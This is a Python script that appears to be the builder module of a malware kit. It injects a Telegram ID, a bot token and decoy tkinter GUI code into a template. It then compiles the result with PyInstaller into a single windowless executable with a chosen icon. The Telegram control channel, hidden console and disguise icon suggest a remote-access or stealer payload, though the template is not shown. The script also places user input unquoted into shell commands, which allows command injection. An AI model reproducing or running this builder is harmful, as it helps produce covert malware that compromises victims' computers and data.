from colorama import init, Fore, Style
from subprocess import getoutput
from modules import banner
from time import sleep
init()
def printer(per="0"):
    banner.clear()
    banner.same_banner()
    print(Fore.GREEN + f"Creating EXE file({per}%).")
    sleep(1)
def make_python(ID, TOKEN, NAME, CODE_ADDR, OFFLINE_CODE_ADDR, platform):
    with open(platform, "r") as read: 
        text = read.readlines()
        with open(CODE_ADDR, "r") as read:
            reader = read.readlines()
            reader = "".join(reader)
            reader = reader.split("\n")
            tkinter_code = """"""
            for i in reader:
                tkinter_code += f"    {i}\n"
        with open(OFFLINE_CODE_ADDR, "r") as read:
            reader = read.readlines()
            reader = "".join(reader)
            reader = reader.split("\n")
            offline_tkinter_code = """"""
            for i in reader:
                offline_tkinter_code += f"    {i}\n"
        text = "".join(text).replace("TELEGRAM_ID", ID).replace("BOT_TOKEN", f'"{TOKEN}"').replace("TK_CODE", tkinter_code).replace("OFFLINE_TKINTER_CODE", offline_tkinter_code)
    getoutput("mkdir output")
    with open(f"output/{NAME}.py", "w") as write:
        write.write(text)
    print(Fore.GREEN + "File is created in /output directory.")
def make_exe(NAME, ICON): 
    printer("0")
    getoutput("mkdir output/exe")
    printer("15")
    out = getoutput(f"pyinstaller --name {NAME} --onefile -i {ICON} --noconsole --distpath output/exe output/{NAME}.py")
    printer("50")
    with open("log/pyinstaller-out.txt", "w") as file:
        file.write(out)
        printer("80")
    printer("100")
    print(Fore.GREEN + f"\n\n.exe application is created in /output/exe/{NAME}.exe\n{Fore.YELLOW} If not check log/pyinstaller-out.txt")